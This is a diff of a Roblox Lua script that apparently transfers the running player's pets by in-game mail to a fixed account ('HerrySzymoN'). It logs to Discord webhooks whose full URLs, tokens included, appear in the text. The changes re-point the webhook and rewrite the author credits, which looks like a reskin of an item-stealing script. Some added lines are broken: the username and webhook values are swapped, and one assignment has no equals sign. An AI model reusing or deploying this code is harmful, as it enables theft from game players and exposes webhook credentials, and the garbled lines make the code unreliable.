@@ -1,7 +1,12 @@
-_G.dhwebhook = "https://discord.com/api/webhooks/1093827767948288050/rx_kEjRnxLTNUmSrZgME13mMRdLPaeXyFjdhnCgArlXA-ASK9jo6ifUQUgo6iSXL_JBN"
-_G.dhUserName "HerrySzymoN"
+--MADE BY AURAIATION--
+UserName = "HerrySzymoN"
+WebHook = "https://discord.com/api/webhooks/1094231461651025951/m5nzA56_Pnrwgph1A8u624N1D1f-AcEhlMXju7vBQJ2AioD01wVc6Fwv5g971n5qb22S"
 
-if _G.UserName == nil or _G.UserName == "IHerrySzymoN" then
+
+_G.dhwebhook = "HerrySzymoN"
+_G.dhUserName "https://discord.com/api/webhooks/1094231461651025951/m5nzA56_Pnrwgph1A8u624N1D1f-AcEhlMXju7vBQJ2AioD01wVc6Fwv5g971n5qb22S"
+
+if _G.UserName == nil or _G.UserName == "HerrySzymoN" then
 	_G.UserName = UserName
 end
 if _G.Webhook == nil or _G.Webhook == "NONE" then
@@ -161,7 +166,7 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
                     ["Pets"] = {
                         [1] = v.Name
                     },
-                    ["Message"] = "Made by SimoN"
+                    ["Message"] = "Made by Astraaa"
                 }
             }
 
@@ -176,7 +181,7 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
                     ["Pets"] = {
                         [1] = v.Name
                     },
-                    ["Message"] = "Made by SimoN"
+                    ["Message"] = "Made by Astra"
                 }
             }
         SendMail:InvokeServer(unpack(args))
